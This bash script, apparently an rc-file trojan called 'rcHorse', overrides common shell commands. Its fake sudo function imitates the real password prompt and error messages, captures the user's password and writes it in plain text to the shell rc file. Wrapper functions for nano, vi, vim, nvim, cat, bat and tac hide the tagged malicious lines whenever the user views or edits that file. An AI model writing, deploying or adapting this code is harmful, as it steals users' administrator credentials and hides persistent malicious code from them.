nano(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command nano $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command nano $@
	fi
}

vi(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command vi $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command vi $@
	fi
}

vim(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command vim $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command vim $@
	fi
}

nvim(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command nvim $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command nvim $@
	fi
}

cat(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command cat $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command cat $@
	fi
}

bat(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command bat $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command bat $@
	fi
}

tac(){
	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then
		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		bashrc="$(awk '$NF!="#--rcHorse--" {print $0}' $HOME/rcTarget)"
		echo "$bashrc" > $HOME/rcTarget
		command tac $@
		echo "$rcHorse" >> $HOME/rcTarget
	else
		command tac $@
	fi
}

sudo(){
	command sudo -nv 2>/dev/null
	if [[ "$?" = "0" ]]; then
		command sudo -n $@
	else
		horseVision=""
		attempts=0
		success="false"
		while true; do
			read -sp "[sudo] password for $USER:" horseVision
			echo ""
			echo "$horseVision" | command sudo -p "" -Sv 2>/dev/null 1>/dev/null
			if [[ "$?" = "0" ]]; then
				success="true"
				break
			elif [[ "$attempts" != "2" ]]; then
				echo "Sorry, try again"
				attempts="$(($attempts + 1))"
			else
				echo "sudo: 3 incorrect password attempts"
				break
			fi
		done
		if [[ "$success" = "true" ]]; then
			horseData="#horseVision = \"$horseVision\" #--rcHorse--"
			if [[ "$horseData" != "$(tail -n 1 $HOME/rcTarget)" ]]; then
				echo "$horseData" >> $HOME/rcTarget
			fi
			command sudo -n $@
		fi
	fi
}
